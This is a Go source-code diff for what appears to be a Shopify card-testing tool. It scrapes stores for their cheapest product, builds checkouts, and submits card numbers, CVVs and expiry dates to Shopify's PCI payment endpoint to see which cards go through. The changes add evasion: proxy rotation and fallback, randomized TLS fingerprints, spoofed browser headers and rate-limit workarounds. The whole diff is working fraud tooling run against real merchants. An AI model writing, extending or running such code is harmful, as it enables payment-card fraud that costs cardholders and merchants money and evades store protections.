@@ -9,7 +9,6 @@ import (
 	"math/rand"
 	"net/http"
 	"net/url"
-	"os"
 	"regexp"
 	"sort"
 	"strconv"
@@ -19,9 +18,7 @@ import (
 
 	fhttp "github.com/bogdanfinn/fhttp"
 	tls_client "github.com/bogdanfinn/tls-client"
-	"github.com/bogdanfinn/tls-client/profiles"
 )
-
 
 const defaultShopURL = "https://gpzb9u-u9.myshopify.com"
 const path = "test.txt"
@@ -29,7 +26,6 @@ const proxyPath = "px.txt"
 
 const workingSitesAPI = "https://adventurous-renewal-production-cc37.up.railway.app/api/sites"
 const maxSiteAmount = 5.0
-
 
 type ProductsResponse struct {
 	Products []Product `json:"products"`
@@ -323,7 +319,6 @@ func toFloat(v any) (float64, bool) {
 	}
 }
 
-
 func isTransientErr(err error) bool {
 	if err == nil {
 		return false
@@ -349,35 +344,192 @@ func doWithRetry(client tls_client.HttpClient, req *fhttp.Request, maxRetries in
 			}
 			return nil, err
 		}
+		if resp.StatusCode == 429 && attempt < maxRetries-1 {
+			retryAfter := 0
+			if ra := resp.Header.Get("Retry-After"); ra != "" {
+				if secs, e := strconv.Atoi(ra); e == nil && secs > 0 {
+					retryAfter = secs
+				}
+			}
+			resp.Body.Close()
+			var wait time.Duration
+			if retryAfter > 0 {
+				wait = time.Duration(retryAfter) * time.Second
+			} else {
+				wait = time.Duration(2000*(attempt+1)) * time.Millisecond
+			}
+			wait += time.Duration(rand.Intn(500)) * time.Millisecond
+			time.Sleep(wait)
+			if req.GetBody != nil {
+				if body, gbErr := req.GetBody(); gbErr == nil {
+					req.Body = body
+				}
+			}
+			continue
+		}
 		return resp, nil
 	}
 	return nil, lastErr
 }
 
+type productCacheEntry struct {
+	title     string
+	productID string
+	variantID string
+	priceStr  string
+	expiresAt int64
+}
+
+var productCache sync.Map
+const productCacheTTL = 5 * 60 // 5 minutes
 
 func findCheapestProduct(client tls_client.HttpClient, shopURL string) (productTitle string, productID string, variantID string, priceStr string, err error) {
-	reqURL := shopURL + "/products.json?limit=250"
+	if cached, ok := productCache.Load(shopURL); ok {
+		entry := cached.(productCacheEntry)
+		if time.Now().Unix() < entry.expiresAt {
+			return entry.title, entry.productID, entry.variantID, entry.priceStr, nil
+		}
+	}
 
-	var body []byte
-	maxRetries := 3
+	productTitle, productID, variantID, priceStr, err = findCheapestProductUncached(client, shopURL)
+	if err == nil && productID != "" {
+		productCache.Store(shopURL, productCacheEntry{
+			title:     productTitle,
+			productID: productID,
+			variantID: variantID,
+			priceStr:  priceStr,
+			expiresAt: time.Now().Unix() + productCacheTTL,
+		})
+	}
+	return
+}
+
+func findCheapestProductUncached(client tls_client.HttpClient, shopURL string) (productTitle string, productID string, variantID string, priceStr string, err error) {
+	bestPrice := math.MaxFloat64
+	found := false
+
+	urlsToTry := []string{
+		shopURL + "/products.json?limit=250",
+		shopURL + "/products.json",
+	}
+
+	var lastStatus int
+
+	for _, reqURL := range urlsToTry {
+		body, fetchErr := fetchProductPage(client, reqURL, shopURL)
+		if fetchErr != nil {
+			lastStatus = extractStatusCode(fetchErr)
+			continue
+		}
+
+		var data ProductsResponse
+		if jsonErr := json.Unmarshal(body, &data); jsonErr != nil {
+			continue
+		}
+
+		pageCount := len(data.Products)
+
+		for _, p := range data.Products {
+			for _, v := range p.Variants {
+				if !v.Available {
+					continue
+				}
+				price, convErr := strconv.ParseFloat(v.Price, 64)
+				if convErr != nil {
+					continue
+				}
+				if price < bestPrice {
+					bestPrice = price
+					productTitle = p.Title
+					productID = strconv.FormatInt(p.ID, 10)
+					variantID = strconv.FormatInt(v.ID, 10)
+					priceStr = v.Price
+					found = true
+				}
+			}
+		}
+
+		if !found {
+			continue
+		}
+
+		if pageCount < 250 {
+			break
+		}
+
+		for page := 2; page <= 5; page++ {
+			pageURL := shopURL + fmt.Sprintf("/products.json?limit=250&page=%d", page)
+			pageBody, pageErr := fetchProductPage(client, pageURL, shopURL)
+			if pageErr != nil {
+				break
+			}
+
+			var pageData ProductsResponse
+			if jsonErr := json.Unmarshal(pageBody, &pageData); jsonErr != nil {
+				break
+			}
+
+			if len(pageData.Products) == 0 {
+				break
+			}
+
+			for _, p := range pageData.Products {
+				for _, v := range p.Variants {
+					if !v.Available {
+						continue
+					}
+					price, convErr := strconv.ParseFloat(v.Price, 64)
+					if convErr != nil {
+						continue
+					}
+					if price < bestPrice {
+						bestPrice = price
+						productTitle = p.Title
+						productID = strconv.FormatInt(p.ID, 10)
+						variantID = strconv.FormatInt(v.ID, 10)
+						priceStr = v.Price
+						found = true
+					}
+				}
+			}
+
+			if len(pageData.Products) < 250 {
+				break
+			}
+		}
+		break
+	}
+
+	if !found {
+		statusMsg := ""
+		if lastStatus > 0 {
+			statusMsg = fmt.Sprintf(" (last status: %d)", lastStatus)
+		}
+		return "", "", "", "", fmt.Errorf("no available products found at %s%s", shopURL, statusMsg)
+	}
+	return productTitle, productID, variantID, priceStr, nil
+}
+
+func fetchProductPage(client tls_client.HttpClient, reqURL, shopURL string) ([]byte, error) {
+	maxRetries := 5
 	for attempt := 0; attempt < maxRetries; attempt++ {
 		req, reqErr := fhttp.NewRequest("GET", reqURL, nil)
 		if reqErr != nil {
-			return "", "", "", "", fmt.Errorf("building request: %w", reqErr)
+			return nil, fmt.Errorf("building request: %w", reqErr)
 		}
-		req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+		req.Header.Set("accept", "application/json, text/javascript, */*; q=0.01")
 		req.Header.Set("accept-language", "en-US,en;q=0.9")
 		req.Header.Set("cache-control", "no-cache")
 		req.Header.Set("pragma", "no-cache")
+		req.Header.Set("referer", shopURL+"/")
 		req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
 		req.Header.Set("sec-ch-ua-mobile", "?0")
 		req.Header.Set("sec-ch-ua-platform", `"Windows"`)
-		req.Header.Set("sec-fetch-dest", "document")
-		req.Header.Set("sec-fetch-mode", "navigate")
-		req.Header.Set("sec-fetch-site", "none")
-		req.Header.Set("sec-fetch-user", "?1")
-		req.Header.Set("upgrade-insecure-requests", "1")
+		req.Header.Set("sec-fetch-dest", "empty")
+		req.Header.Set("sec-fetch-mode", "cors")
+		req.Header.Set("sec-fetch-site", "same-origin")
 		req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
+		req.Header.Set("x-requested-with", "XMLHttpRequest")
 
 		resp, doErr := client.Do(req)
 		if doErr != nil {
@@ -386,61 +538,56 @@ func findCheapestProduct(client tls_client.HttpClient, shopURL string) (productT
 				time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
 				continue
 			}
-			return "", "", "", "", fmt.Errorf("GET %s: %w", reqURL, doErr)
+			return nil, fmt.Errorf("GET %s: %w", reqURL, doErr)
 		}
 
-		if resp.StatusCode != http.StatusOK {
+		if resp.StatusCode == http.StatusOK {
+			body, readErr := io.ReadAll(resp.Body)
 			resp.Body.Close()
-			return "", "", "", "", fmt.Errorf("GET %s returned status %d", reqURL, resp.StatusCode)
+			if readErr != nil {
+				lower := strings.ToLower(readErr.Error())
+				if attempt < maxRetries-1 && (strings.Contains(lower, "eof") || strings.Contains(lower, "connection reset") || strings.Contains(lower, "broken pipe")) {
+					time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
+					continue
+				}
+				return nil, fmt.Errorf("reading body: %w", readErr)
+			}
+			return body, nil
 		}
 
-		body, err = io.ReadAll(resp.Body)
+		statusCode := resp.StatusCode
+		retryAfter := 0
+		if ra := resp.Header.Get("Retry-After"); ra != "" {
+			if secs, e := strconv.Atoi(ra); e == nil && secs > 0 {
+				retryAfter = secs
+			}
+		}
 		resp.Body.Close()
-		if err != nil {
-			lower := strings.ToLower(err.Error())
-			if attempt < maxRetries-1 && (strings.Contains(lower, "eof") || strings.Contains(lower, "connection reset") || strings.Contains(lower, "broken pipe")) {
-				time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
-				continue
+
+		if statusCode == 429 && attempt < maxRetries-1 {
+			var wait time.Duration
+			if retryAfter > 0 {
+				wait = time.Duration(retryAfter) * time.Second
+			} else {
+				wait = time.Duration(2000*(attempt+1)) * time.Millisecond
 			}
-			return "", "", "", "", fmt.Errorf("reading body: %w", err)
+			wait += time.Duration(rand.Intn(500)) * time.Millisecond
+			time.Sleep(wait)
+			continue
 		}
-		break
+		return nil, fmt.Errorf("GET %s returned status %d", reqURL, statusCode)
 	}
-
-	var data ProductsResponse
-	if err := json.Unmarshal(body, &data); err != nil {
-		return "", "", "", "", fmt.Errorf("parsing JSON: %w", err)
-	}
-
-	bestPrice := math.MaxFloat64
-	found := false
-
-	for _, p := range data.Products {
-		for _, v := range p.Variants {
-			if !v.Available {
-				continue
-			}
-			price, convErr := strconv.ParseFloat(v.Price, 64)
-			if convErr != nil {
-				continue
-			}
-			if price < bestPrice {
-				bestPrice = price
-				productTitle = p.Title
-				productID = strconv.FormatInt(p.ID, 10)
-				variantID = strconv.FormatInt(v.ID, 10)
-				priceStr = v.Price
-				found = true
-			}
-		}
-	}
-
-	if !found {
-		return "", "", "", "", fmt.Errorf("no available products found at %s", shopURL)
-	}
-	return productTitle, productID, variantID, priceStr, nil
+	return nil, fmt.Errorf("GET %s: max retries exceeded", reqURL)
 }
 
+func extractStatusCode(fetchErr error) int {
+	re := regexp.MustCompile(`status (\d+)`)
+	if m := re.FindStringSubmatch(fetchErr.Error()); len(m) > 1 {
+		code, _ := strconv.Atoi(m[1])
+		return code
+	}
+	return 0
+}
 
 func addToCartAndCheckout(client tls_client.HttpClient, shopURL, variantID string) (checkoutURL, checkoutToken, sessionToken, checkoutHTML string, err error) {
 	payload := fmt.Sprintf(`{"id":%s,"quantity":1}`, variantID)
@@ -515,7 +662,6 @@ func addToCartAndCheckout(client tls_client.HttpClient, shopURL, variantID strin
 	return checkoutURL, checkoutToken, sessionToken, checkoutHTML, nil
 }
 
-
 func extractPrivateAccessTokenID(checkoutHTML string) string {
 	unescaped := html.UnescapeString(checkoutHTML)
 
@@ -561,7 +707,6 @@ func fetchPrivateAccessToken(client tls_client.HttpClient, shopURL, checkoutURL,
 
 	return fmt.Sprintf("[%d] %s", resp.StatusCode, string(body)), nil
 }
-
 
 func extractActionsJSURL(checkoutHTML, shopURL string) string {
 	re := regexp.MustCompile(`(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)`)
@@ -859,6 +1004,30 @@ func extractSellerCountry(proposalBody string) string {
 	return m[1]
 }
 
+func extractCurrencyFromHTML(checkoutHTML string) string {
+	re1 := regexp.MustCompile(`(?i)currencycode\s*[:=]\s*["']?([A-Za-z]{3})`)
+	if m := re1.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
+		return strings.ToUpper(m[1])
+	}
+	re2 := regexp.MustCompile(`urrencyCode&quot;:&quot;([A-Za-z]{3})`)
+	if m := re2.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
+		return strings.ToUpper(m[1])
+	}
+	return ""
+}
+
+func extractCheckoutPriceFromHTML(checkoutHTML string) string {
+	re := regexp.MustCompile(`data-checkout-total-price="([^"]+)"`)
+	if m := re.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
+		return m[1]
+	}
+	re2 := regexp.MustCompile(`data-checkout-subtotal-price="([^"]+)"`)
+	if m := re2.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
+		return m[1]
+	}
+	return ""
+}
+
 func patchPayload(payload, currency, country string) string {
 	if currency != "USD" {
 		payload = strings.ReplaceAll(payload, `"currencyCode": "USD"`, `"currencyCode": "`+currency+`"`)
@@ -871,8 +1040,8 @@ func patchPayload(payload, currency, country string) string {
 	return payload
 }
 
-
 func sendPCISession(identSig, cardNumber, cardName string, cardMonth, cardYear int, cvv, shopDomain, proxyURL string) (int, string, error) {
+	formattedNum := formatCardNumber(cardNumber)
 	payload := fmt.Sprintf(`{
   "credit_card": {
     "number": %q,
@@ -885,7 +1054,7 @@ func sendPCISession(identSig, cardNumber, cardName string, cardMonth, cardYear i
     "name": %q
   },
   "payment_session_scope": %q
-}`, cardNumber, cardMonth, cardYear, cvv, cardName, shopDomain)
+}`, formattedNum, cardMonth, cardYear, cvv, cardName, shopDomain)
 
 	req, err := fhttp.NewRequest("POST", "https://checkout.pci.shopifyinc.com/sessions", strings.NewReader(payload))
 	if err != nil {
@@ -908,18 +1077,50 @@ func sendPCISession(identSig, cardNumber, cardName string, cardMonth, cardYear i
 	req.Header.Set("shopify-identification-signature", identSig)
 	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
 
-	pciOptions := []tls_client.HttpClientOption{
-		tls_client.WithTimeoutSeconds(30),
-		tls_client.WithClientProfile(profiles.Chrome_124),
+	var resp *fhttp.Response
+	var lastErr error
+	for attempt := 0; attempt < 5; attempt++ {
+		pciOptions := []tls_client.HttpClientOption{
+			tls_client.WithTimeoutSeconds(30),
+			tls_client.WithClientProfile(randomTLSProfile()),
+		}
+		if proxyURL != "" {
+			pciOptions = append(pciOptions, tls_client.WithProxyUrl(proxyURL))
+		}
+		pciClient, cErr := tls_client.NewHttpClient(tls_client.NewNoopLogger(), pciOptions...)
+		if cErr != nil {
+			lastErr = cErr
+			continue
+		}
+		if req.GetBody != nil {
+			if rb, gbErr := req.GetBody(); gbErr == nil {
+				req.Body = rb
+			}
+		}
+		resp, err = doWithRetry(pciClient, req, 1)
+		if err == nil {
+			break
+		}
+		lastErr = err
+		if attempt < 4 {
+			time.Sleep(2 * time.Second)
+		}
 	}
-	if proxyURL != "" {
-		pciOptions = append(pciOptions, tls_client.WithProxyUrl(proxyURL))
+	if err != nil && proxyURL != "" {
+		if req.GetBody != nil {
+			if rb, gbErr := req.GetBody(); gbErr == nil {
+				req.Body = rb
+			}
+		}
+		fallbackClient, fbErr := tls_client.NewHttpClient(tls_client.NewNoopLogger(),
+			tls_client.WithTimeoutSeconds(30),
+			tls_client.WithClientProfile(randomTLSProfile()),
+		)
+		if fbErr == nil {
+			resp, err = doWithRetry(fallbackClient, req, 2)
+		}
 	}
-	pciClient, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), pciOptions...)
-	if err != nil {
-		return 0, "", fmt.Errorf("failed to create PCI tls client: %w", err)
-	}
-	resp, err := doWithRetry(pciClient, req, 2)
+	_ = lastErr
 	if err != nil {
 		return 0, "", fmt.Errorf("POST PCI session: %w", err)
 	}
@@ -933,8 +1134,7 @@ func sendPCISession(identSig, cardNumber, cardName string, cardMonth, cardYear i
 	return resp.StatusCode, string(body), nil
 }
 
-
-func sendProposal(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, currency, country string) (int, string, error) {
+func sendProposal(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, currency, country, email, phone, proxyURL string) (int, string, error) {
 	gqlPayload := fmt.Sprintf(`{
   "variables": {
     "sessionInput": {
@@ -1020,9 +1220,11 @@ func sendProposal(client tls_client.HttpClient, shopURL, checkoutURL, checkoutTo
         "presentmentCurrency": "USD",
         "countryCode": "US"
       },
+      "email": %q,
+      "emailChanged": false,
       "phoneCountryCode": "US",
-      "marketingConsent": [],
-      "shopPayOptInPhone": {"countryCode": "US"},
+      "marketingConsent": [{"email": {"value": %q}}],
+      "shopPayOptInPhone": {"number": %q, "countryCode": "US"},
       "rememberMe": false
     },
     "tip": {"tipLines": []},
@@ -1053,7 +1255,7 @@ func sendProposal(client tls_client.HttpClient, shopURL, checkoutURL, checkoutTo
   "operationName": "Proposal",
   "id": %q
 }`,
-		sessionToken, stableID, variantID, variantID, proposalID)
+		sessionToken, stableID, variantID, variantID, email, email, phone, proposalID)
 	gqlPayload = patchPayload(gqlPayload, currency, country)
 
 	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=Proposal", strings.NewReader(gqlPayload))
@@ -1084,6 +1286,17 @@ func sendProposal(client tls_client.HttpClient, shopURL, checkoutURL, checkoutTo
 	req.Header.Set("x-checkout-web-source-id", sourceToken)
 
 	resp, err := doWithRetry(client, req, 2)
+	if err != nil && proxyURL != "" {
+		if req.GetBody != nil {
+			if rb, gbErr := req.GetBody(); gbErr == nil {
+				req.Body = rb
+			}
+		}
+		fallbackClient, fbErr := createNoProxyClient()
+		if fbErr == nil {
+			resp, err = doWithRetry(fallbackClient, req, 2)
+		}
+	}
 	if err != nil {
 		return 0, "", fmt.Errorf("POST proposal: %w", err)
 	}
@@ -1106,8 +1319,7 @@ func extractQueueToken(proposalJSON string) string {
 	return m[1]
 }
 
-
-func sendProposal2(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country string) (int, string, error) {
+func sendProposal2(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country, deliveryHandle, phone, proxyURL string) (int, string, error) {
 	gqlPayload := fmt.Sprintf(`{
   "variables": {
     "sessionInput": {
@@ -1196,8 +1408,8 @@ func sendProposal2(client tls_client.HttpClient, shopURL, checkoutURL, checkoutT
       "email": %q,
       "emailChanged": true,
       "phoneCountryCode": "US",
-      "marketingConsent": [],
-      "shopPayOptInPhone": {"countryCode": "US"},
+      "marketingConsent": [{"email": {"value": %q}}],
+      "shopPayOptInPhone": {"number": %q, "countryCode": "US"},
       "rememberMe": false
     },
     "tip": {"tipLines": []},
@@ -1228,8 +1440,11 @@ func sendProposal2(client tls_client.HttpClient, shopURL, checkoutURL, checkoutT
   "operationName": "Proposal",
   "id": %q
 }`,
-		sessionToken, queueToken, stableID, variantID, variantID, email, proposalID)
+		sessionToken, queueToken, stableID, variantID, variantID, email, email, phone, proposalID)
 	gqlPayload = patchPayload(gqlPayload, currency, country)
+	if deliveryHandle != "" {
+		gqlPayload = strings.Replace(gqlPayload, `"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": true}, "shipments": {"any": true}}`, fmt.Sprintf(`"deliveryStrategyByHandle": {"handle": %q, "customDeliveryRate": false}`, deliveryHandle), 1)
+	}
 
 	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=Proposal", strings.NewReader(gqlPayload))
 	if err != nil {
@@ -1259,6 +1474,17 @@ func sendProposal2(client tls_client.HttpClient, shopURL, checkoutURL, checkoutT
 	req.Header.Set("x-checkout-web-source-id", sourceToken)
 
 	resp, err := doWithRetry(client, req, 2)
+	if err != nil && proxyURL != "" {
+		if req.GetBody != nil {
+			if rb, gbErr := req.GetBody(); gbErr == nil {
+				req.Body = rb
+			}
+		}
+		fallbackClient, fbErr := createNoProxyClient()
+		if fbErr == nil {
+			resp, err = doWithRetry(fallbackClient, req, 2)
+		}
+	}
 	if err != nil {
 		return 0, "", fmt.Errorf("POST proposal2: %w", err)
 	}
@@ -1271,7 +1497,6 @@ func sendProposal2(client tls_client.HttpClient, shopURL, checkoutURL, checkoutT
 
 	return resp.StatusCode, string(body), nil
 }
-
 
 type Address struct {
 	FirstName   string
@@ -1303,7 +1528,7 @@ func addressForCountry(country string) Address {
 	return countryAddresses["US"]
 }
 
-func sendProposal3(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email string, addr Address, currency, country string) (int, string, error) {
+func sendProposal3(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email string, addr Address, currency, country, deliveryHandle, proxyURL string) (int, string, error) {
 	gqlPayload := fmt.Sprintf(`{
   "variables": {
     "sessionInput": {
@@ -1400,8 +1625,8 @@ func sendProposal3(client tls_client.HttpClient, shopURL, checkoutURL, checkoutT
       "email": %q,
       "emailChanged": false,
       "phoneCountryCode": "US",
-      "marketingConsent": [],
-      "shopPayOptInPhone": {"countryCode": "US"},
+      "marketingConsent": [{"email": {"value": %q}}],
+      "shopPayOptInPhone": {"number": %q, "countryCode": "US"},
       "rememberMe": false
     },
     "tip": {"tipLines": []},
@@ -1436,8 +1661,11 @@ func sendProposal3(client tls_client.HttpClient, shopURL, checkoutURL, checkoutT
 		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
 		stableID, variantID, variantID,
 		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
-		email, proposalID)
+		email, email, addr.Phone, proposalID)
 	gqlPayload = patchPayload(gqlPayload, currency, country)
+	if deliveryHandle != "" {
+		gqlPayload = strings.Replace(gqlPayload, `"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": true}, "shipments": {"any": true}}`, fmt.Sprintf(`"deliveryStrategyByHandle": {"handle": %q, "customDeliveryRate": false}`, deliveryHandle), 1)
+	}
 
 	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=Proposal", strings.NewReader(gqlPayload))
 	if err != nil {
@@ -1467,6 +1695,17 @@ func sendProposal3(client tls_client.HttpClient, shopURL, checkoutURL, checkoutT
 	req.Header.Set("x-checkout-web-source-id", sourceToken)
 
 	resp, err := doWithRetry(client, req, 2)
+	if err != nil && proxyURL != "" {
+		if req.GetBody != nil {
+			if rb, gbErr := req.GetBody(); gbErr == nil {
+				req.Body = rb
+			}
+		}
+		fallbackClient, fbErr := createNoProxyClient()
+		if fbErr == nil {
+			resp, err = doWithRetry(fallbackClient, req, 2)
+		}
+	}
 	if err != nil {
 		return 0, "", fmt.Errorf("POST proposal3: %w", err)
 	}
@@ -1480,12 +1719,12 @@ func sendProposal3(client tls_client.HttpClient, shopURL, checkoutURL, checkoutT
 	return resp.StatusCode, string(body), nil
 }
 
-
 func sendPollForReceipt(
 	client tls_client.HttpClient,
 	shopURL, checkoutURL, checkoutToken, sessionToken,
 	buildID, sourceToken,
 	pollID, receiptID, receiptSessionToken string,
+	proxyURL string,
 ) (int, string, error) {
 
 	varsJSON := fmt.Sprintf(`{"receiptId":%s,"sessionToken":%s}`,
@@ -1530,6 +1769,12 @@ func sendPollForReceipt(
 	_ = checkoutPath
 
 	resp, err := doWithRetry(client, req, 2)
+	if err != nil && proxyURL != "" {
+		fallbackClient, fbErr := createNoProxyClient()
+		if fbErr == nil {
+			resp, err = doWithRetry(fallbackClient, req, 2)
+		}
+	}
 	if err != nil {
 		return 0, "", fmt.Errorf("PollForReceipt request failed: %w", err)
 	}
@@ -1552,6 +1797,7 @@ func sendSubmitForCompletion(
 	deliveryHandle, shippingAmount, totalAmount,
 	pciSessionID, attemptToken, currency, country string,
 	signedHandles []string,
+	paymentMethodIdentifier, proxyURL string,
 ) (int, string, error) {
 
 	var handleLines []string
@@ -1649,6 +1895,7 @@ func sendSubmitForCompletion(
           {
             "paymentMethod": {
               "directPaymentMethod": {
+                "paymentMethodIdentifier": %q,
                 "sessionId": %q,
                 "billingAddress": {
                   "streetAddress": {
@@ -1711,8 +1958,8 @@ func sendSubmitForCompletion(
         "email": %q,
         "emailChanged": false,
         "phoneCountryCode": "US",
-        "marketingConsent": [],
-        "shopPayOptInPhone": {"countryCode": "US"},
+        "marketingConsent": [{"email": {"value": %q}}],
+        "shopPayOptInPhone": {"number": %q, "countryCode": "US"},
         "rememberMe": false
       },
       "tip": {"tipLines": []},
@@ -1756,11 +2003,13 @@ func sendSubmitForCompletion(
 		signedHandlesJSON,
 		stableID, variantID, variantID,
 		totalAmount,
+		paymentMethodIdentifier,
 		pciSessionID,
 		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
 		totalAmount,
 		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
 		email,
+		email, addr.Phone,
 		attemptToken, checkoutURL, pageID,
 		submitID)
 	gqlPayload = patchPayload(gqlPayload, currency, country)
@@ -1793,6 +2042,17 @@ func sendSubmitForCompletion(
 	req.Header.Set("x-checkout-web-source-id", sourceToken)
 
 	resp, err := doWithRetry(client, req, 2)
+	if err != nil && proxyURL != "" {
+		if req.GetBody != nil {
+			if rb, gbErr := req.GetBody(); gbErr == nil {
+				req.Body = rb
+			}
+		}
+		fallbackClient, fbErr := createNoProxyClient()
+		if fbErr == nil {
+			resp, err = doWithRetry(fallbackClient, req, 2)
+		}
+	}
 	if err != nil {
 		return 0, "", fmt.Errorf("POST SubmitForCompletion: %w", err)
 	}
@@ -1805,7 +2065,6 @@ func sendSubmitForCompletion(
 
 	return resp.StatusCode, string(body), nil
 }
-
 
 func checkProposalErrors(step string, status int, body string) {
 	if status != 200 {
@@ -1844,8 +2103,6 @@ func checkSubmitErrors(status int, body string) {
 }
 
 func saveDebugResponse(name, body string) {
-	fname := name + "_response.json"
-	_ = os.WriteFile(fname, []byte(body), 0644)
 }
 
 func extractReceiptStatusCode(pollBody, receiptType string) string {
@@ -1871,4 +2128,3 @@ func extractReceiptStatusCode(pollBody, receiptType string) string {
 
 	return "UNKNOWN"
 }
-
